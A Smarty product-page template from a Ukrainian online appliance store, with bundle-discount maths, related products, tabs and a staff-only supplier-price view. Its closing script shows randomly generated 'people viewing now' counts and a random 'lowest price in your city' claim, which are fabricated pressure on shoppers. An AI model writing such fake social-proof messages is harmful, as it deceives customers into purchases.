                                                 {math equation="(x+y*0.92)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                 {elseif $assocItem.rent >= 12.5}
                                                 {math equation="(x+y*0.95)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                 {elseif $assocItem.rent >= 7.5}
                                                 {math equation="(x+y*0.98)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                 {else}
                                                 {math equation="(x+y)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн
                                                 {/if}
                                            {/if}</span>

                                        <span style="margin-top: 10px;color: #fa5662;display: block;text-align: center;"><span style="color: black;">Вы экономите</span>
                                        <span style="text-decoration: underline;">
                                        {if $item.rent >= 25}
                                                {if $assocItem.rent >= 25}
                                                {math equation="(x+y)*$curs_evro_smarty-((x*0.92+y*0.92)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.08+y*0.08)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                                {elseif $assocItem.rent >= 12.5}
                                                {math equation="(x+y)*$curs_evro_smarty-((x*0.92+y*0.95)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.08+y*0.05)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                                {elseif $assocItem.rent >= 7.5}
                                                {math equation="(x+y)*$curs_evro_smarty-((x*0.92+y*0.98)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.08+y*0.02)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                                {else}
                                                {math equation="(x+y)*$curs_evro_smarty-((x*0.92+y)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.08)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                                {/if}

                                            {elseif $item.rent >= 12.5}
                                                {if $assocItem.rent >= 25}
                                                {math equation="(x+y)*$curs_evro_smarty-((x*0.95+y*0.92)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.05+y*0.08)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                                {elseif $assocItem.rent >= 12.5}
                                                {math equation="(x+y)*$curs_evro_smarty-((x*0.95+y*0.95)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.05+y*0.05)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                                {elseif $assocItem.rent >= 7.5}
                                                {math equation="(x+y)*$curs_evro_smarty-((x*0.95+y*0.98)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.05+y*0.02)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                                {else}
                                                {math equation="(x+y)*$curs_evro_smarty-((x*0.95+y)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.05)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                                {/if}

                                            {elseif $item.rent >= 7.5}
                                            {if $assocItem.rent >= 25}
                                            {math equation="(x+y)*$curs_evro_smarty-((x*0.98+y*0.92)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.02+y*0.08)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                            {elseif $assocItem.rent >= 12.5}
                                            {math equation="(x+y)*$curs_evro_smarty-((x*0.98+y*0.95)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.02+y*0.05)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                            {elseif $assocItem.rent >= 7.5}
                                            {math equation="(x+y)*$curs_evro_smarty-((x*0.98+y*0.98)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.02+y*0.02)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                            {else}
                                            {math equation="(x+y)*$curs_evro_smarty-((x*0.98+y)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((x*0.02)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                            {/if}

                                            {else}
                                            {if $assocItem.rent >= 25}
                                            {math equation="(x+y)*$curs_evro_smarty-((x+y*0.92)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((y*0.08)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                            {elseif $assocItem.rent >= 12.5}
                                            {math equation="(x+y)*$curs_evro_smarty-((x+y*0.95)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((y*0.05)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                            {elseif $assocItem.rent >= 7.5}
                                            {math equation="(x+y)*$curs_evro_smarty-((x+y*0.98)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*({math equation="round(((y*0.02)*$curs_evro_smarty*100)/((x+y)*$curs_evro_smarty))" x=$item.price y=$assocItem.price}%)*}
                                            {else}
                                            {math equation="(x+y)*$curs_evro_smarty-((x+y)*$curs_evro_smarty)|round" x=$item.price y=$assocItem.price} грн {*(0%)*}
                                            {/if}
                                            {/if}
                                            </span></span>

                                        <span style="display: block;text-align: center;margin-top: -3px;color: #509b5d;font-weight: bold;"><span style="color: black;"><!--От --></span>
                                        	{if $item.rent >= 25}
                                                {if $assocItem.rent >= 25}
                                                {math equation="(x*0.92+y*0.92)/8*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                                {elseif $assocItem.rent >= 12.5}
                                                {math equation="(x*0.92/3+y*0.95/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                                {elseif $assocItem.rent >= 7.5}
                                                {math equation="(x*0.92/3+y*0.98/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                                {else}
                                                {math equation="(x*0.92/3+y/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                                {/if}

                                            {elseif $item.rent >= 12.5}
                                                {if $assocItem.rent >= 25}
                                                {math equation="(x*0.95/3+y*0.92/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                                {elseif $assocItem.rent >= 12.5}
                                                {math equation="(x*0.95/6+y*0.95/6)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                                {elseif $assocItem.rent >= 7.5}
                                                {math equation="(x*0.95/3+y*0.98/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                                {else}
                                                {math equation="(x*0.95/3+y/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                                {/if}

                                            {elseif $item.rent >= 7.5}
                                            {if $assocItem.rent >= 25}
                                            {math equation="(x*0.98/3+y*0.92/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                            {elseif $assocItem.rent >= 12.5}
                                            {math equation="(x*0.98/3+y*0.95/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                            {elseif $assocItem.rent >= 7.5}
                                            {math equation="(x*0.98/3+y*0.98/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                            {else}
                                            {math equation="(x*0.98/3+y/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                            {/if}

                                            {else}
                                            {if $assocItem.rent >= 25}
                                            {math equation="(x/3+y*0.92/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                            {elseif $assocItem.rent >= 12.5}
                                            {math equation="(x/3+y*0.95/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                            {elseif $assocItem.rent >= 7.5}
                                            {math equation="(x/3+y*0.98/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                            {else}
                                            {math equation="(x/3+y/3)*$curs_evro_smarty|round" x=$item.price y=$assocItem.price} грн/мес
                                            {/if}
                                            {/if}

                                             <span style="color: black;"> (кредит 0%)</span></span>
                                             <!--{if $login == 'Гальченко Владимир'}
                                             {$item.rent} || {$assocItem.rent}<br>
                                             {$item.price*$curs_evro_smarty} || {$assocItem.price*$curs_evro_smarty}
                                             {/if}-->


                                        <center><a style="
    margin-top: 10px;
    background-image: linear-gradient(to bottom, #5bde71, #2ba247);
    background-color: #5bde71;padding: 7px;padding-left: 15px;padding-right: 15px;
    " href="#data-basket" onclick="addToCart({$item.id});addToCart({$assocItem.id});" data-toggle="modal" data-producterommerceid="{$item.id}" class="btn btn-info data-AddToCart data-itemId-{$item.id}"><i class="icon-shopping-cart icon-white"></i> <span>Купить комплект</span></a></center>

                                    </div>
                                </div>
                            </div>
                        </li>
                        {/if}
                    {/foreach}
                {/foreach}
            </ul><!-- // #lightSlider -->

            </div>
        <!-- End Slider -->
        {if $numberofasoc==0}
        {literal}
        <script type="text/javascript">
        document.getElementById('slider_asoc_aviable').style.display = "none";
        </script>
        {/literal}
        {/if}

        {/if}
        {if $assocItemsVmeste|@count > 0 && $login != 'Vitaliy Shyshko'}
            <div class="product_box">
                <div class="product_box_title">
                    <span>С этим товаром покупают</span>
                </div>
                <img class="left_arrow" onclick='prev_product($(this), 4);' src="/assets/media/left-arrow.png">
                <img class="right_arrow" onclick='next_product($(this), 4);' src="/assets/media/right_arrow.png">

                <div class="products_container_wrapper">
                    <div class="products_container">
                        {foreach from=$assocItemsVmeste item=assocItemsVmeste name=similarItems}
                            {foreach from=$assocItemsVmeste.items item=assocItem}
                                {if $assocItem.bonus_amount > 0}
                                    <div class="product_icon" data-qtip="1">
                                {else}
                                    <div class="product_icon">
                                {/if}
                                <div class="prev_bonus" style="display:none;">
                                    Купив {$assocItem.brand} {$assocItem.name} у нас, Вы получаете +{$assocItem.bonus_amount|round}грн на бонусный счет к цене!
                                </div>
                                <a href='{iurl assoc.parent=$assocItem.parentname assoc.subdomain=$assocItem.subdomain assoc.cat_latin=$assocItem.cat_latin_single assoc.brand=$assocItem.brand assoc.item=$assocItem.name}' class="product_icon_title">{$assocItem.brand} {$assocItem.name}</a>

                                <span class="product_icon_cat">{if $assocItem.cat_onename}{$assocItem.cat_onename}{else}{$assocItem.cat}{/if}</span>

                                <a href='{iurl assoc.parent=$assocItem.parentname assoc.subdomain=$assocItem.subdomain assoc.cat_latin=$assocItem.cat_latin_single assoc.brand=$assocItem.brand assoc.item=$assocItem.name}'>
                                    <div class='products_container_image_wrap'>
                                        <img src='/images/catalog/{$assocItem.imgid}_s.{$assocItem.imgext}' alt=''>
                                    </div>
                                </a>

                                {if $assocItem.acttype=='gift'}
                                    <a href="#gift-modal-{$assocItem.id}" data-toggle="modal" class='one_item_gift data-getActInfo' id="i_{$assocItem.id}">
                                        <span class='one_item_gift_img'>
                                            <img src='/images/catalog/{gift assoc.id=$assocItem.actid}' />
                                        </span>
                                        <span class='one_item_gift_title'>Подарок</span>
                                    </a>
                                {/if}

                                <div class="price_info">
                                   <!-- <span class="style_price">Цена:</span><br />-->

                                    {if $assocItem.specprice  && ($assocItem.bdprice > $assocItem.price) && (($assocItem.bdprice - $assocItem.price)/$assocItem.price > 0.01)}
                                        <div style="margin-bottom: -5px;" class="price strike">
                                            <span style="font-size: 19px;" >{price $assocItem.bdprice $assocItem.id_currency}</span>
                                        </div><br>
                                        <div class="action_price">
                                            <span>{price $assocItem.price $assocItem.id_currency}</span> <span>{$smarty.session.Currency.title}</span>
                                        </div>
                                    {else}
                                        <div class="price">
                                            <span style="color: #0d8abc;">{price $assocItem.price $assocItem.id_currency}</span> <sup style="color: #0d8abc;">{$smarty.session.Currency.title}</sup>
                                        </div>
                                    {/if}
{literal}
<style type="text/css">
    .prodbox_buy_button:hover{
        background-image: linear-gradient(to bottom, #5bde71, #54d56f) !important;
        text-decoration: none;
    }
</style>
{/literal}
                                    <a style="float: right;
    margin-top: -3px;
    background-image: linear-gradient(to bottom, #5bde71, #2ba247);
    background-color: #5bde71;
    margin-right: 15px;" data-toggle="modal" href="#data-basket" onclick="addToCart({$assocItem.id})" class='one_item_blue_button prodbox_buy_button data-AddToCart data-itemId-{$assocItem.id}'> Купить</a>
                                </div><!-- // price_info -->

                                {if $assocItem.bestprice > $assocItem.price || $assocItem.id2==41385}
                                    <i title="Лучшая цена" class="sale-icon sale-icon-price"></i>
                                {/if}
                                {if $assocItem.specprice && ($assocItem.bdprice > $assocItem.price) && (($assocItem.bdprice - $assocItem.price) > 1) && !($assocItem.sale==1 && $assocItem.d90==-1)}
                                    <i title="Акционная цена" class="sale-icon sale-icon-discount"></i>
                                {/if}
                                {if $assocItem.sale==1 && $assocItem.d90==-1}
                                    <i title="Распродажа" class="sale-icon sale-icon-sale"></i>
                                {/if}

                        </div><!-- // .product_icon -->
                            {/foreach}
                        {/foreach}

                    </div><!-- // .products_container -->
                </div><!-- // .products_container_wrapper -->
            </div><!-- // .product_box -->
        {/if}

        {if $item.brand == 'Electrolux'}
        <!-- Minisite -->
            <div style="{if $electrolux_action==1}margin-top: 40px;{/if}" id="flix-minisite"></div>
            <div id="flix-inpage"></div>
            <script type="text/javascript" src="//media.flixfacts.com/js/loader.js" data-flix-distributor="12386" data-flix-language="u2" data-flix-brand="Electrolux" data-flix-mpn="{php}echo str_replace(' ', '', $this->item->name);{/php}" data-flix-ean="" data-flix-sku="" data-flix-button="flix-minisite" data-flix-inpage="flix-inpage" data-flix-button-image="" data-flix-price="">
            </script>
        <!-- Minisite End -->
        {/if}

        <div class="tabs">
            <ul id="itemTab" class="nav nav-tabs">
                <li><a href="#info" data-toggle="tab">Описание</a></li>
                {if $fields}<li class="data-primary"><a href="#fields" data-toggle="tab">Характеристики</a></li>{/if}
                {if $item.images|@count > 1}<li><a href="#gallery" data-toggle="tab">Фото</a></li>{/if}
                {if $video.type=='youtube'}<li><a href="#video" data-toggle="tab">Видео</a></li>{/if}
                {if $similarItems|@count > 0}<li><a href="#similarItems" data-toggle="tab"><span class='strong'>Похожие модели</span></a></li>{/if}
                <li><a href="#comments" data-toggle="tab">Отзывы {if $comments|@count > 0}({$comments|@count}){/if}</a></li>
                {if in_array($login, array('Сергей Гринюк', 'Гальченко Владимир', 'Александр Несторук', 'Нина Китова', 'Vadyus', 'Vitaliy Shyshko', 'Владимир Литвинов'))}
                    <li><a data-toggle="tab" href="#contractor">Поставщик</a></li>
                {/if}
            </ul>

            <div class="tab-content" itemprop='description'>
                <div class="tab-pane" id="info">
                    {if $item.full_info}{$item.full_info}{else}{$item.short_info}{/if}
                </div>

                {if $fields}
                    <div class="tab-pane fade" id="fields">
                        <table class="table table-stripped">
                            {foreach from=$fields item=_group}
                                {if $_group.name}
                                    <tr><th colspan="2">{$_group.name}</th></tr>
                                    {foreach from=$_group.fields item=_field name=td_dot1}
                                        {if !empty($_field.value)}
                                            <tr>
                                                <td class="field-name">
                                                    {if !empty($_field.description)}
                                                        <span class="data-field" rel="popover" data-original-title="{$_field.name}" data-content="{$_field.description|htmlspecialchars}" data-placement="right">{$_field.name}</span>
                                                    {else}
                                                        {$_field.name}
                                                    {/if}
                                                </td>
                                                <td>{$_field.value}</td>
                                            </tr>
                                        {/if}
                                    {/foreach}

                                {else}
                                    {foreach from=$_group.fields item=_field name=td_dot}
                                        {if !empty($_field.value) || $_field.value!=''}
                                            <tr>
                                                <td>
                                                    {if $_field.hasTerm}
                                                        <span onclick="getTerm({$_field.name})">{$_field.name}</span>
                                                    {else}{$_field.name}{/if}
                                                </td>
                                                <td>{$_field.value}</td>
                                            </tr>
                                        {/if}
                                    {/foreach}
                                {/if}
                            {/foreach}
                        </table>
                    </div><!-- // tab-pane -->
                {/if}

                <div class="tab-pane fade" id="gallery">
                    <div class="gallerySimages">
                        {foreach from=$item.images item=item_image name=item_image}
                            <a rel="prettyPhoto[pp]" href="{$url.img}/catalog/{$item_image.id}.{$item_image.imgext}" alt="{if $item.cat_onename}{$item.cat_onename|mblower}{else}{$item.cat|mblower}{/if} {$item.brand} {$item.name} {'купить'}" title="{if $item.cat_onename}{$item.cat_onename|mblower}{else}{$item.cat|mblower}{/if} {$item.brand} {$item.name}">
                                <img itemprop="image" {if $item_image.id}src="{$url.img}/catalog/{$item_image.id}_s.{$item_image.imgext}"{else}src="{$url.img}/no-image.jpg"{/if} alt="{if $item.cat_onename}{$item.cat_onename|mblower}{else}{$item.cat|mblower}{/if} {$item.brand} {$item.name} {'купить'}" title="{if $item.cat_onename}{$item.cat_onename|mblower}{else}{$item.cat|mblower}{/if} {$item.brand} {$item.name}" />
                            </a>
                        {/foreach}
                    </div><!-- // .gallerySimages -->
                </div><!-- // .tab-pane #gallery -->

                {if $similarItems|@count > 0}
                    <div class="tab-pane fade" id="similarItems">
                        {foreach from=$similarItems item=altItem name=similarItems}
                            <div class="tab-item">
                                <div class="tab-item-img">
                                    {if $altItem.imgid}
                                        <a href="{iurl assoc.subdomain=$item.subdomain assoc.parent=$altItem.parentname assoc.cat_latin=$altItem.cat_latin_single assoc.brand=$altItem.brand assoc.item=$altItem.name}">
                                            <img {if $altItem.imgid}src="{$url.img}/catalog/{$altItem.imgid}_s.{$altItem.imgext}"{else} src="/{$module}/images/noImg.png"{/if} alt="{if $altItem.cat_onename}{$altItem.cat_onename|mblower}{else}{$altItem.cat|mblower}{/if} {$altItem.brand} {$altItem.name} купить" title="{if $altItem.cat_onename}{$altItem.cat_onename|mblower}{else}{$altItem.cat|mblower}{/if} {$altItem.brand} {$altItem.name}" />
                                        </a>
                                    {/if}
                                </div><!-- // .tab-item-img -->

                                <div class="tab-item-info">
                                    <div class="tab-item-info-name">{if $altItem.cat_onename}{$altItem.cat_onename}{else}{$altItem.cat}{/if}</div>
                                    <div class="tab-item-info-brand"><a href="{iurl assoc.subdomain=$item.subdomain assoc.parent=$altItem.parentname assoc.cat_latin=$altItem.cat_latin_single assoc.brand=$altItem.brand assoc.item=$altItem.name}" title="{$altItem.brand} {$altItem.name}" rel="tooltip" data-placement="top" data-original-title="{$altItem.brand} {$altItem.name}">{$altItem.brand} {$altItem.name}</a></div>

                                    <div class="tab-item-info-stock">
                                        {if !($altItem.archive == 1 && $altItem.id_availability == 3)}
                                            {if $altItem.id_availability == 1} <strong class="in-stock">Есть в наличии{/if}</strong>
                                            {if $altItem.id_availability == 2 && $item.qrm>0} Наличие уточняйте
                                            {elseif $altItem.id_availability == 2 && $item.qrm==0 || $item.qrm==""} <a class="on-order" target="_blank" href="/articles/4" title="Как получить товар под заказ">Под заказ</a>{/if}
                                            {if $altItem.id_availability == 3} <a class="on-order" target="_blank" href="/articles/4" title="Как получить товар под заказ">Под заказ</a>{/if}
                                            {if $altItem.id_availability == 4} <strong class="in-stock" rel="tooltip" data-placement="top" data-original-title="Есть в наличии. Доставка через 5 рабочих дней" title="Есть в наличии. Доставка через 5 рабочих дней">Есть в наличии. Доставка через 5 рабочих дней</strong>{/if}
                                        {/if}
                                    </div><!-- // .tab-item-info-stock -->

                                    <div class="tab-item-info-price">{price $altItem.price $altItem.id_currency} {$smarty.session.Currency.title}</div>
                                    <div class="tab-item-info-buy"><a href="#data-basket" onclick="addToCart({$altItem.id});" data-toggle="modal" class="btn btn-info">Купить</a></div>
                                </div><!-- // .tab-item-info -->
                            </div><!-- // .tab-item -->
                        {/foreach}
                    </div><!-- // .tab-pane #similarItems -->
                {/if}

                {if $video.type=='youtube'}
                    <div class="tab-pane fade" id="video">
                        <iframe title="YouTube video player" width="480" height="390" src="https://www.youtube.com/embed/{$video.code}" frameborder="0" allowfullscreen></iframe>
                    </div>
                {/if}

                <div class="tab-pane fade" id="comments">
                    <div class="one_item_reviews_head">
                        <span class="one_item_reviews_title">Отзывы о {$item.brand} {$item.name}</span>
                        <a href="#comments-modal" class="one_item_blue_button one_item_reviews_button" data-toggle="modal">Оставить отзыв</a>
                    </div>

                    {foreach from=$comments item=comment}
                        <div class="one_item_comment_block{if $comment.name == 'Менеджер интернет-магазина 590.ua' || $comment.name == '590.ua'} one_item_child_comment_block{/if}">
                            <div class="one_item_comment_title">
                                <span class="{if $comment.name == 'Менеджер интернет-магазина 590.ua' || $comment.name == '590.ua'}one_item_comment_moder{else}one_item_comment_name{/if}">{$comment.name}</span>
                                {if $comment.name !== 'Менеджер интернет-магазина 590.ua' && $comment.name !== '590.ua'}
                                    <span class="one_item_comment_date">{$comment.date}</span>
                                    <div class="one_item_rating">
                                        <img src="/assets/media/star_on.png" alt="rating star">
                                        <img src="/assets/media/star_on.png" alt="rating star">
                                        <img src="/assets/media/star_on.png" alt="rating star">
                                        <img src="/assets/media/star_on.png" alt="rating star">
                                        <img src="/assets/media/star_off.png" alt="rating star">
                                    </div><!-- // .one_item_rating -->
                                {/if}
                            </div><!-- // .one_item_comment_title -->
                            <span class="one_item_comment_content">{$comment.text}</span>
                        </div><!-- // .one_item_comment_block -->
                    {/foreach}
                </div><!-- // .tab-pane #comments -->

                {if in_array($login, array('Сергей Гринюк', 'Гальченко Владимир', 'Александр Несторук', 'Vadyus', 'Vitaliy Shyshko', 'Владимир Литвинов'))}
                    <div class="tab-pane fade" id="contractor">
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>Поставщик</th>
                                    <th>Код поставщика</th>
                                    <th>Дата</th>
                                    <th>Цена</th>
                                </tr>
                            </thead>
                            <tbody>
                                {foreach from=$item.suppliers item=supplier}
                                    <tr>
                                        <td>{$supplier.name}</td>
                                        <td>{$supplier.code}</td>
                                        <td>{$supplier.update_date}</td>
                                        <td>{$supplier.price}</td>
                                    </tr>
                                {/foreach}
                            </tbody>
                        </table>
                    </div><!-- // .tab-pane #contractor -->
                {/if}
            </div><!-- // .tab-content -->
        </div><!-- // .tabs -->

        <div id="itemsCompareForm">
            <a id="holiday_close" href="#" class="modalCloseImg" onclick="javascript:$.modal.close();return false;"></a>
        </div>

        {literal}
<!-- тут когда то был код ремаркетинга -->

            <script>
                function addToCartEcommerce(id) {
                    // console.log(productForEcommerce[id]);
                    ga('ec:addProduct', {
                        'id': productForEcommerce[id].id,
                        'name': productForEcommerce[id].name,
                        'category': productForEcommerce[id].category,
                        'position': productForEcommerce[id].position,
                        'price': productForEcommerce[id].price
                    });
                    ga('ec:setAction', 'add', {list: productForEcommerce[id].category});
                    ga('send', 'event', 'UX', 'click', 'add to cart'); // Отправка данных
                }
                $('a.btn-info').click(function(){
                    if($(this).data('producterommerceid'))
                        addToCartEcommerce($(this).data('producterommerceid'));
                });
            </script>
        {/literal}

{if $item.id_availability == 1}
{literal}
<style type="text/css">
    .ui-state-highlight, .ui-widget-content .ui-state-highlight, .ui-widget-header .ui-state-highlight{
        background-image: linear-gradient(45deg,#F24645,#EBC08D);border: none;color: black;font-size: 13px;
    }
</style>

<script type="text/javascript">
function randomInteger(min, max) {
    var rand = min - 0.5 + Math.random() * (max - min + 1)
    rand = Math.round(rand);
    return rand;
  }

function get_id_region(){
 	var txt = document.getElementById("this_city_name").innerHTML;
 	return txt;
 }

 function timer_delivery() {
     var nowDate = new Date();
     var achiveDate = new Date(nowDate.getFullYear(),nowDate.getMonth(),nowDate.getDate(),17,0,0); //Задаем дату, к которой будет осуществляться обратный отсчет
     var result = (achiveDate - nowDate)+1000;
     if (result < 0) {
         var elmnt = document.getElementById('timer_delivery');
         elmnt.innerHTML = 'при заказе до 17:00 завтрашнего дня';
         var elmnt2 = document.getElementById('timer_delivery_day');
         elmnt2.innerHTML = 'послезавтра';
         return undefined;
     }
     var seconds = Math.floor((result/1000)%60);
     var minutes = Math.floor((result/1000/60)%60);
     var hours = Math.floor((result/1000/60/60)%24);
     var days = Math.floor(result/1000/60/60/24);
     if (seconds < 10) seconds = '0' + seconds;
     if (minutes < 10) minutes = '0' + minutes;
     if (hours < 10) hours = '0' + hours;
     var elmnt = document.getElementById('timer_delivery');
     if (hours!='00') {
     	elmnt.innerHTML = /*days + ':' + */'<strong>при заказе до 17:00</strong> (осталось ' + hours + ' часов и ' + minutes + ' минут)';
     } else
     	elmnt.innerHTML = /*days + ':' + hours + ':' + */'<strong>при заказе до 17:00</strong> (осталось ' + minutes + ' минут и ' + seconds + ' секунд)';
     	setTimeout(timer_delivery,1000);
 }
 window.onload = function() {
     timer_delivery();
 }

 var thisDate = new Date();
 var endDate = new Date(thisDate.getFullYear(),thisDate.getMonth(),thisDate.getDate(),23,59,0);
 var startDate = new Date(thisDate.getFullYear(),thisDate.getMonth(),thisDate.getDate(),7,0,0);

    $.jGrowl.defaults.closerTemplate = '<div>[ скрыть подсказки ]</div>';

if ((thisDate < endDate) && (startDate < thisDate)) {
    if (randomInteger(0,1)==1) {
    	setTimeout(function(){
    	var viewers_count = randomInteger(1,7);
    	if ((viewers_count == 1) || (viewers_count == 5) || (viewers_count == 6) ||(viewers_count == 7)) {
    		var viewers_count_desc = 'человек';
    	} else {
    		var viewers_count_desc = 'человека';
    	}
        $.jGrowl("Сейчас этот товар просматривают<br><strong>"+viewers_count+" "+viewers_count_desc+"</strong>", { position: 'bottom-left', header: '<strong>Пользуется спросом!</strong>', sticky: true});
    }, 6000);
    }}

var today_date_name = new Date();
var friday_num = today_date_name.getDay();
if (get_id_region()=='Киев') {
if (friday_num == 6 || friday_num == 7) {
    if (randomInteger(0,1)==1) {
         $.jGrowl("Можем доставить эту модель во <span style='font-weight:bold;'>вторник</span> в течении дня по городу <strong>"+get_id_region()+"</strong>, <strong>при заказе на выходных или до 17:00 в понедельник</strong>", { position: 'bottom-left', header: '<strong>Быстрая и удобная доставка</strong>', sticky: true});
     }
} else if (friday_num == 5){
    if (randomInteger(0,1)==1) {
         $.jGrowl("Можем доставить эту модель в <span style='font-weight:bold;'>понедельник</span> в течении дня по городу <strong>"+get_id_region()+"</strong>, <strong>при заказе сегодня до 17:00</strong>", { position: 'bottom-left', header: '<strong>Быстрая и удобная доставка</strong>', sticky: true});
     }
 } else {
   if (randomInteger(0,1)==1) {
        $.jGrowl("Можем доставить эту модель <span id='timer_delivery_day' style='font-weight:bold;'>завтра</span> в течении дня по городу <strong>"+get_id_region()+"</strong>, <span id='timer_delivery'></span>", { position: 'bottom-left', header: '<strong>Быстрая и удобная доставка</strong>', sticky: true});
    }}}

/*ДОБАВИТЬ ПОСЛЕДНИЙ РАЗ ЭТОТ ТОВАР КУПИЛ ТАКОЙ ТО и ТОГДА ТО*/
   /* if (randomInteger(0,1)==1) {
        setTimeout(function(){
        $.jGrowl("Этот товар последний раз был куплен", { position: 'bottom-left', header: '<strong>Недавно покупали</strong>', sticky: true});
    }, 9000);
    }*/

    /*if (randomInteger(1,1)==1) {
        setTimeout(function(){
        $.jGrowl("При совершении заказа в течении<br><strong>1 часа до 17:00</strong> - Вы получите персональную скидку от менеджера", { position: 'bottom-left', header: '<strong>Оплата со скидкой</strong>', sticky: true});
    }, 1000);
    }*/

    if (randomInteger(0,1)==1) {
        setTimeout(function(){
        $.jGrowl("Это самая низкая цена, которую вы видели в городе <strong>"+get_id_region()+"</strong>", { position: 'bottom-left', header: '<strong>Вам повезло!</strong>', sticky: true});
    }, 12000);
    }
</script>
{/literal}
{/if}

{else}
                {include file='error/404.tpl'}
{/if}

        <div class="clearfix"></div>
        </div>

        {include file='_footer.tpl'}
